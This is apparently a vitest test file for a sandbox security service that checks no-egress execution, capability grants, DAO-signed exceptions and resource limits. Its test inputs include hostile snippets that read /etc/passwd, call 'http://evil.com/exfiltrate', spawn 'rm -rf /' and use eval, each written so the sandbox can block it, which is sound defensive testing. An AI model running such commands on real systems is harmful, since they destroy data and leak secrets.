/**
 * WASM Sandbox Security Tests
 * Tests no-egress WASM execution environment, capability-based security,
 * and DAO-signed capability exceptions
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import WASMSandboxSecurityService from '../services/WASMSandboxSecurityService.mjs';
import crypto from 'crypto';

describe('WASM Sandbox Security Service', () => {
  let sandboxService;

  beforeEach(async () => {
    sandboxService = new WASMSandboxSecurityService({
      maxExecutionTime: 5000, // Shorter timeout for tests
      maxMemoryUsage: 64 * 1024 * 1024, // 64MB for tests
      daoSignatureRequired: false // Disable for most tests
    });
  });

  afterEach(async () => {
    if (sandboxService) {
      sandboxService.removeAllListeners();
    }
  });

  describe('No-Egress WASM Execution Environment', () => {
    it('should execute safe WASM code successfully', async () => {
      const safeCode = `
        const result = Math.sqrt(16);
        console.log('Square root of 16 is:', result);
        return result;
      `;

      const execution = await sandboxService.executeInSandbox(safeCode);

      expect(execution.status).toBe('completed');
      expect(execution.result.success).toBe(true);
      expect(execution.violations).toHaveLength(0);
      expect(execution.grantedCapabilities).toEqual([]);
    });

    it('should block filesystem access attempts', async () => {
      const maliciousCode = `
        const fs = require('fs');
        fs.readFileSync('/etc/passwd');
      `;

      await expect(sandboxService.executeInSandbox(maliciousCode))
        .rejects.toThrow(/filesystem access required/);
    });

    it('should block network access attempts', async () => {
      const maliciousCode = `
        const http = require('http');
        http.get('http://evil.com/exfiltrate');
      `;

      await expect(sandboxService.executeInSandbox(maliciousCode))
        .rejects.toThrow(/network access required/);
    });

    it('should block process spawning attempts', async () => {
      const maliciousCode = `
        const { spawn } = require('child_process');
        spawn('rm', ['-rf', '/']);
      `;

      await expect(sandboxService.executeInSandbox(maliciousCode))
        .rejects.toThrow(/process access required/);
    });

    it('should detect dangerous patterns in code', async () => {
      const dangerousCode = `
        eval('malicious code here');
        process.exit(1);
      `;

      await expect(sandboxService.executeInSandbox(dangerousCode))
        .rejects.toThrow(/Security pre-check failed/);
    });
  });

  describe('Capability-Based Security', () => {
    it('should grant allowed capabilities', async () => {
      const code = `
        const hash = compute.hash('test data');
        console.log('Hash:', hash);
        return hash;
      `;

      const execution = await sandboxService.executeInSandbox(code, {
        capabilities: ['compute']
      });

      expect(execution.status).toBe('completed');
      expect(execution.grantedCapabilities).toContain('compute');
      expect(execution.result.success).toBe(true);
    });

    it('should deny blocked capabilities without exceptions', async () => {
      const code = `
        const fs = require('fs');
        return fs.readFileSync('/test');
      `;

      const execution = await sandboxService.executeInSandbox(code, {
        capabilities: ['filesystem']
      });

      expect(execution.status).toBe('security_violation');
      expect(execution.violations.length).toBeGreaterThan(0);
      expect(execution.violations.some(v => v.type === 'capability_not_granted')).toBe(true);
    });

    it('should enforce memory limits', async () => {
      const memoryHogCode = `
        const bigArray = new Array(1000000).fill('x'.repeat(1000));
        return bigArray.length;
      `;

      const execution = await sandboxService.executeInSandbox(memoryHogCode);

      // Should either fail during execution or be flagged in post-audit
      if (execution.status === 'completed') {
        expect(execution.securityChecks.some(check => 
          check.violations.some(v => v.type === 'memory_limit_exceeded')
        )).toBe(true);
      } else {
        expect(execution.status).toBe('failed');
      }
    });

    it('should enforce execution time limits', async () => {
      const infiniteLoopCode = `
        while(true) {
          // Infinite loop
        }
      `;

      await expect(sandboxService.executeInSandbox(infiniteLoopCode))
        .rejects.toThrow(/timeout/);
    });
  });

  describe('DAO-Signed Capability Exceptions', () => {
    beforeEach(() => {
      // Enable DAO signature requirement for these tests
      sandboxService.config.daoSignatureRequired = true;
    });

    it('should grant capability exception with valid DAO signature', async () => {
      const capability = 'filesystem';
      const daoSignature = crypto.createHash('sha256')
        .update(`dao_capability_${capability}`)
        .digest('hex');

      const exception = await sandboxService.grantCapabilityException(capability, daoSignature);

      expect(exception.capability).toBe(capability);
      expect(exception.active).toBe(true);
      expect(exception.exceptionId).toBeDefined();
      expect(new Date(exception.expiresAt)).toBeInstanceOf(Date);
    });

    it('should reject capability exception with invalid DAO signature', async () => {
      const capability = 'filesystem';
      const invalidSignature = 'invalid_signature';

      await expect(sandboxService.grantCapabilityException(capability, invalidSignature))
        .rejects.toThrow(/Invalid DAO signature/);
    });

    it('should use capability exception for blocked capability', async () => {
      const capability = 'filesystem';
      const daoSignature = crypto.createHash('sha256')
        .update(`dao_capability_${capability}`)
        .digest('hex');

      // Grant exception
      await sandboxService.grantCapabilityException(capability, daoSignature);

      // Now try to use the capability
      const code = `
        console.log('Filesystem access granted via DAO exception');
        return 'success';
      `;

      const execution = await sandboxService.executeInSandbox(code, {
        capabilities: ['filesystem']
      });

      expect(execution.grantedCapabilities).toContain('filesystem');
    });

    it('should revoke capability exception', async () => {
      const capability = 'network';
      const daoSignature = crypto.createHash('sha256')
        .update(`dao_capability_${capability}`)
        .digest('hex');

      // Grant exception
      const exception = await sandboxService.grantCapabilityException(capability, daoSignature);

      // Revoke exception
      const revokedException = await sandboxService.revokeCapabilityException(exception.exceptionId);

      expect(revokedException.active).toBe(false);
      expect(revokedException.revokedAt).toBeDefined();
    });

    it('should expire capability exceptions', async () => {
      const capability = 'network';
      const daoSignature = crypto.createHash('sha256')
        .update(`dao_capability_${capability}`)
        .digest('hex');
      const shortExpiration = new Date(Date.now() + 100).toISOString(); // 100ms

      // Grant short-lived exception
      await sandboxService.grantCapabilityException(capability, daoSignature, shortExpiration);

      // Wait for expiration
      await new Promise(resolve => setTimeout(resolve, 200));

      // Try to use expired exception
      const code = `return 'should fail';`;

      const execution = await sandboxService.executeInSandbox(code, {
        capabilities: ['network']
      });

      expect(execution.grantedCapabilities).not.toContain('network');
    });

    it('should limit usage count of capability exceptions', async () => {
      const capability = 'filesystem';
      const daoSignature = crypto.createHash('sha256')
        .update(`dao_capability_${capability}`)
        .digest('hex');

      // Grant exception
      const exception = await sandboxService.grantCapabilityException(capability, daoSignature);

      // Use exception multiple times up to limit
      const code = `return 'test';`;
      
      for (let i = 0; i < exception.maxUsage; i++) {
        const execution = await sandboxService.executeInSandbox(code, {
          capabilities: ['filesystem']
        });
        expect(execution.grantedCapabilities).toContain('filesystem');
      }

      // Next usage should fail
      const finalExecution = await sandboxService.executeInSandbox(code, {
        capabilities: ['filesystem']
      });
      expect(finalExecution.grantedCapabilities).not.toContain('filesystem');
    });
  });

  describe('Security Monitoring and Violation Detection', () => {
    it('should detect and log security violations', async () => {
      const maliciousCode = `
        try {
          const fs = require('fs');
        } catch (e) {
          console.log('Filesystem blocked');
        }
        
        try {
          eval('console.log("code injection")');
        } catch (e) {
          console.log('Eval blocked');
        }
        
        return 'completed';
      `;

      await expect(sandboxService.executeInSandbox(maliciousCode))
        .rejects.toThrow(/Security pre-check failed/);
    });

    it('should validate execution output for data exfiltration', async () => {
      const suspiciousCode = `
        return {
          data: 'http://evil.com/exfiltrate',
          ip: '192.168.1.1',
          email: 'user@example.com'
        };
      `;

      const execution = await sandboxService.executeInSandbox(suspiciousCode);

      // Should complete but flag suspicious output
      expect(execution.status).toBe('completed');
      const postAudit = execution.securityChecks.find(check => check.checkType === 'post_execution_audit');
      expect(postAudit.violations.length).toBeGreaterThan(0);
    });

    it('should enforce execution frequency limits', async () => {
      const code = `return Math.random();`;
      const source = 'test_source';

      // Execute multiple times rapidly
      const promises = [];
      for (let i = 0; i < 15; i++) { // Exceed limit of 10 per minute
        promises.push(sandboxService.executeInSandbox(code, { source }));
      }

      const results = await Promise.allSettled(promises);
      
      // Some should fail due to frequency limits
      const failures = results.filter(r => r.status === 'rejected');
      expect(failures.length).toBeGreaterThan(0);
    });
  });

  describe('Sandbox Isolation', () => {
    it('should prevent access to global objects', async () => {
      const code = `
        try {
          return global.process.env;
        } catch (e) {
          return 'global access blocked';
        }
      `;

      const execution = await sandboxService.executeInSandbox(code);

      expect(execution.status).toBe('completed');
      expect(execution.result.output).toBe('global access blocked');
    });

    it('should provide restricted console access', async () => {
      const code = `
        console.log('This should work');
        console.error('This should also work');
        return 'console test completed';
      `;

      const execution = await sandboxService.executeInSandbox(code);

      expect(execution.status).toBe('completed');
      expect(execution.result.success).toBe(true);
    });

    it('should provide safe crypto operations', async () => {
      const code = `
        const hash = compute.hash('test data');
        const random = compute.random();
        return { hash, random };
      `;

      const execution = await sandboxService.executeInSandbox(code, {
        capabilities: ['compute']
      });

      expect(execution.status).toBe('completed');
      expect(execution.result.output.hash).toBeDefined();
      expect(execution.result.output.random).toBeDefined();
    });

    it('should monitor memory usage', async () => {
      const code = `
        const usage = memory.usage();
        return usage;
      `;

      const execution = await sandboxService.executeInSandbox(code, {
        capabilities: ['memory']
      });

      expect(execution.status).toBe('completed');
      expect(execution.result.output.heapUsed).toBeGreaterThan(0);
      expect(execution.result.output.limit).toBe(sandboxService.config.maxMemoryUsage);
    });
  });

  describe('Service Management', () => {
    it('should provide health check information', async () => {
      const health = await sandboxService.healthCheck();

      expect(health.status).toBe('healthy');
      expect(health.config.maxExecutionTime).toBeDefined();
      expect(health.config.maxMemoryUsage).toBeDefined();
      expect(health.timestamp).toBeDefined();
    });

    it('should track execution history', async () => {
      const code = `return 'test execution';`;

      const execution = await sandboxService.executeInSandbox(code);
      const history = sandboxService.getExecutionHistory();

      expect(history.length).toBeGreaterThan(0);
      expect(history.some(h => h.executionId === execution.executionId)).toBe(true);
    });

    it('should track capability exceptions', async () => {
      sandboxService.config.daoSignatureRequired = false;
      
      const capability = 'filesystem';
      const daoSignature = 'test_signature';

      await sandboxService.grantCapabilityException(capability, daoSignature);
      const exceptions = sandboxService.getCapabilityExceptions();

      expect(exceptions.length).toBeGreaterThan(0);
      expect(exceptions.some(e => e.capability === capability)).toBe(true);
    });

    it('should add and manage DAO public keys', async () => {
      const publicKey = crypto.randomBytes(32).toString('hex');

      sandboxService.addDAOPublicKey(publicKey);

      const health = await sandboxService.healthCheck();
      expect(health.daoPublicKeys).toBe(1);
    });
  });

  describe('Error Handling', () => {
    it('should handle malformed WASM code gracefully', async () => {
      const malformedCode = `
        this is not valid javascript code {{{
      `;

      await expect(sandboxService.executeInSandbox(malformedCode))
        .rejects.toThrow();
    });

    it('should handle worker thread failures', async () => {
      const crashingCode = `
        throw new Error('Intentional crash');
      `;

      await expect(sandboxService.executeInSandbox(crashingCode))
        .rejects.toThrow(/Intentional crash/);
    });

    it('should handle capability exception errors', async () => {
      await expect(sandboxService.revokeCapabilityException('nonexistent'))
        .rejects.toThrow(/not found/);
    });
  });
});